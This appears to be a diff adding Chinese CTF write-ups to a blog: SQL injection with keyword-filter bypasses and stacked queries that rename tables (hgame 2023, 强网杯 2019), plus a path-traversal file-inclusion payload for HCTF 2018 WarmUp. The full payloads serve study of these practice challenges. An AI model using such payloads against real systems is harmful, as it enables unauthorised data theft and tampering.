@@ -534,7 +534,101 @@
 <blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/v2board/v2board/blob/master/app/Http/Routes/AdminRoute.php">路由接口源码</a><br><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/k_3IoymZL510wET8P3YHAw?ref=www.ctfiot.com">V2Board Admin.php 越权访问漏洞</a><br><br><a target="_blank" rel="noopener" href="https://zgao.top/v2board-v-1-6-1-%e6%9c%ba%e5%9c%ba%e9%9d%a2%e6%9d%bf%e7%ae%a1%e7%90%86%e6%8e%a5%e5%8f%a3%e8%b6%8a%e6%9d%83%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/">v2board v.1.6.1 机场面板管理接口越权漏洞分析</a></p>
 </blockquote>
+<p>2023-01-23 WP</p>
 <h1 id="T2-hgame-2023-Search-Commodity"><a href="#T2-hgame-2023-Search-Commodity" class="headerlink" title="T2 [hgame 2023]Search Commodity"></a>T2 [hgame 2023]Search Commodity</h1><p><a target="_blank" rel="noopener" href="https://hgame.vidar.club/contest/3">题目地址</a></p>
+<p>弱密码登录，找个字典用Burp Suite暴力破解一下就好，密码比较常见：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名:user01</span><br><span class="line">密  码:admin123</span><br></pre></td></tr></table></figure>
+
+<p>“简易的查询面板，只需要输入id数字，就可以查到兔兔最近买的东西（包括年货）”，从题目描述基本上能够判断考察sql注入，但是不知道过滤了什么，需要自己测试。先按要求输入id数字<code>1</code>，查询结果为<code>hard disk 1</code>，然后试一试<code>and 1</code>，查询结果不变，不难猜测是将部分关键字用replace替换掉了，这跟我上一周遇到的sql题([极客大挑战 2019]BabySQL)很像。同样的办法可以测出部分我们将要用到的其他被过滤的字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and, or, select, union, from, where, database, =, /**/, &lt;, &gt;</span><br></pre></td></tr></table></figure>
+
+<p>值得注意的是，这里空格也被过滤了：输入<code>o r1</code>查询结果不变。可能是先对输入的内容中所有的空格进行了去除，然后再对其他字符进行二次过滤。绕过空格可以使用<strong>注释符<code>/**/</code><strong>和括号<code>()</code>。之后再用</strong>双写绕过</strong>即可。</p>
+<p>爆字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0//**/**/oorrder//**/**/by//**/**/4#                    //测试为4时报错，故字段数为3</span><br></pre></td></tr></table></figure>
+
+<p>判断回显位为2, 3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0//**/**/uunionnion//**/**/sselectelect//**/**/1,2,3#   </span><br></pre></td></tr></table></figure>
+
+<p>爆库名为<code>se4rch</code>，很奇怪，这里只能把库名放第二个回显位，否则回显<code>Not Found 0</code>，留个疑问。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0//**/**/uunionnion//**/**/sselectelect//**/**/1,ddatabaseatabase(),3#                           </span><br></pre></td></tr></table></figure>
+
+<p>爆表名，’&#x3D;’可以用’like’或’!&lt;&gt;’绕过，得到”5ecret15here,L1st,user1nf0”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0//**/**/uunionnion//**/**/sselectelect//**/**/1,group_concat(table_name),3/*/**/*/ffromrom(infoorrmation_schema.tables)wwherehere(table_schema//**/**/like//**/**/ddatabaseatabase())#</span><br></pre></td></tr></table></figure>
+
+<p>爆字段名，得到”f14gggg1shere”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0//**/**/uunionnion//**/**/sselectelect//**/**/1,group_concat(column_name),3/*/**/*/ffromrom(infoorrmation_schema.columns)wwherehere(table_name//**/**/like//**/**/&#x27;5ecret15here&#x27;)#</span><br></pre></td></tr></table></figure>
+
+<p>爆数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0//**/**/uunionnion//**/**/sselectelect//**/**/1,group_concat(f14gggg1shere),3/*/**/*/ffromrom(5ecret15here)#</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到Flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="T3-hgame-2023-Designer"><a href="#T3-hgame-2023-Designer" class="headerlink" title="T3 [hgame 2023]Designer"></a>T3 [hgame 2023]Designer</h1><p><a target="_blank" rel="noopener" href="https://hgame.vidar.club/contest/3">题目地址</a></p>
+<p>题目给了源码。</p>
+<p>2023-01-23 WP</p>
+<h1 id="T4-强网杯-2019-随便注"><a href="#T4-强网杯-2019-随便注" class="headerlink" title="T4 [强网杯 2019]随便注"></a>T4 [强网杯 2019]随便注</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8">题目地址</a></p>
+<p>是一道sql注入题，先用<code>1&#39;</code>判断一下闭合方式，回显报错信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>是用单引号<code>&#39;</code>闭合，万能密码<code>1&#39; or 1=1#</code>能爆出所有数据。<br>下面按部就班的爆字段数(两个字段)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 3#</span><br></pre></td></tr></table></figure>
+
+<p>但是在爆表名的时候发现<code>select</code>被过滤了，且大小写绕过无效。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+
+<h2 id="堆叠注入学习-堆叠查询，Stacked-Queries"><a href="#堆叠注入学习-堆叠查询，Stacked-Queries" class="headerlink" title="堆叠注入学习(堆叠查询，Stacked Queries)"></a>堆叠注入学习(堆叠查询，Stacked Queries)</h2><p>联合查询不可用，这里补充一下堆叠查询的知识。堆叠注入为攻击者提供了很多控制权，与仅限于SELECT语句的UNION联合查询攻击不同，堆叠注入可以用于执行任何SQL语句。</p>
+<h3 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h3><p>在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句。如下图:</p>
+<img src="/2023/01/15/%E9%9B%86%E8%AE%ADWriteUp-3/4-1.png" class="" title="test">
+
+<h3 id="堆叠注入利用"><a href="#堆叠注入利用" class="headerlink" title="堆叠注入利用"></a>堆叠注入利用</h3><p>利用这一点，我们可以用<code>1&#39;;show databases;#</code>查出库名，用<code>1&#39;;show tables;#</code>查出表名:</p>
+<img src="/2023/01/15/%E9%9B%86%E8%AE%ADWriteUp-3/4-2.png" class="" title="tables">
+
+<p>然后用<code>desc</code>查表结构。</p>
+<blockquote>
+<p>这里补充一点，所有数据库对象（数据库名、表名、字段名、索引名等）命名禁止使用MySQL保留关键字，如果要用，就必须加上反引号。对于纯数字的数据库对象也是如此，否则就会报错。</p>
+</blockquote>
+<img src="/2023/01/15/%E9%9B%86%E8%AE%ADWriteUp-3/4-3.png" class="" title="tests">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;desc `1919810931114514`;#</span><br></pre></td></tr></table></figure>
+
+<p>对’1919810931114514’表查一下，找到’flag’字段，但是不能直接进行查询。下面<code>1&#39;;desc words;#</code>查一下’words’的表结构</p>
+<img src="/2023/01/15/%E9%9B%86%E8%AE%ADWriteUp-3/4-4.png" class="" title="words">
+
+<p>可以看到是两个字段，一个是int型的id，另一个是varchar型的data，又结合输入1时的查询结果，不难推测出提交窗口的查询语句形如:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,data from words where id =</span><br></pre></td></tr></table></figure>
+
+<p>。因此，只要我们利用堆叠注入更改’1919810931114514’表名为’words’，再把列名flag改成id，然后用既定的查询功能查询’words’表，就可以实现实际上对’1919810931114514’表的查询啦。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 更改原words表名:</span><br><span class="line">rename table words to bye;</span><br><span class="line"># 更改表名:</span><br><span class="line">rename table `1919810931114514` to words;</span><br><span class="line"># 更改字段名: 【ALTER TABLE &lt;表名&gt; CHANGE &lt;旧字段名&gt; &lt;新字段名&gt; &lt;新数据类型&gt;;】</span><br><span class="line">alter table words change flag id varchar(100);</span><br></pre></td></tr></table></figure>
+
+<h3 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload 1"></a>Payload 1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 更改表名、字段名</span><br><span class="line">1&#x27;;rename table words to bye;rename table `1919810931114514` to words;alter table words change flag id varchar(100);#</span><br><span class="line"># 爆数据</span><br><span class="line">1&#x27; or 1=1#</span><br></pre></td></tr></table></figure>
+
+<h2 id="预处理语句-堆叠注入"><a href="#预处理语句-堆叠注入" class="headerlink" title="预处理语句+堆叠注入"></a>预处理语句+堆叠注入</h2><p>这种办法主要是对select的过滤进行绕过。<br>预处理语句使用方式:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE name from &#x27;[my sql sequece]&#x27;;   //预定义SQL语句</span><br><span class="line">EXECUTE name;  //执行预定义SQL语句</span><br><span class="line">(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL        语句</span><br></pre></td></tr></table></figure>
+
+<p>预定义语句也可以通过变量进行传递:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SET @tn = &#x27;hahaha&#x27;;  //存储表名</span><br><span class="line">SET @sql = concat(&#x27;select * from &#x27;, @tn);  //存储SQL语句</span><br><span class="line">PREPARE name from @sql;   //预定义SQL语句</span><br><span class="line">EXECUTE name;  //执行预定义SQL语句</span><br><span class="line">(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句</span><br></pre></td></tr></table></figure>
+
+<p>然后利用char()函数将select的ASCII码转换为select字符串，或直接用concat()函数拼接select来绕过就可以了。</p>
+<h3 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload 2"></a>Payload 2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;PREPARE hacker from concat(char(115,101,108,101,99,116), &#x27; * from `1919810931114514` &#x27;);EXECUTE hacker;#</span><br><span class="line">1&#x27;;PREPARE hacker from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);EXECUTE hacker;#</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>参考这位师傅的WriteUp: <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6c6a44517dd7">[强网杯 2019]随便注 WriteUp(three way)</a></p>
+</blockquote>
+<p>2023-01-24 WP</p>
+<h1 id="T5-HCTF-2018-WarmUp"><a href="#T5-HCTF-2018-WarmUp" class="headerlink" title="T5 [HCTF 2018]WarmUp"></a>T5 [HCTF 2018]WarmUp</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[HCTF%202018]WarmUp">题目地址</a></p>
+<p>一道简单的PHP代码审计。检查得到提示’source.php’，访问给出源码:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#x27;file&#x27;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>访问’hint.php’被告知”flag not here, and flag in ffffllllaaaagggg”，用源代码中的<code>include</code>文件包含就能打开。首先它先判定了传入的是不是空或者是不是字符串，然后用<code>emmm::checkFile</code>进行了三次白名单判断:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mb_substr(</span><br><span class="line">    string $str,</span><br><span class="line">    int $start,</span><br><span class="line">    int $length = NULL,</span><br><span class="line">    string $encoding = mb_internal_encoding()</span><br><span class="line">)</span><br><span class="line">从start开始截取一定长度的字符串</span><br><span class="line"></span><br><span class="line">strpos(</span><br><span class="line">    string $haystack, </span><br><span class="line">    string $needle, </span><br><span class="line">    int $offset = 0</span><br><span class="line">)</span><br><span class="line">返回 needle 在 haystack 中首次出现的数字位置</span><br></pre></td></tr></table></figure>
+
+<p>第一次$_page取的是从0（第一个字符）开始到第一次出现 ? 之间的字符串，第二次$_page取的是$page的url解码后从0开始到第一次出现 ? 之间的字符串。</p>
+<blockquote>
+<p>事实上，超全局变量$GET和$REQUEST已经被解码过了。</p>
+</blockquote>
+<p>只需要添加一个<code>hint.php?</code>绕过白名单过滤，然后利用任意文件读取漏洞就能成功读到flag了。</p>
+<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php?../../../../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
 
         </div>
 
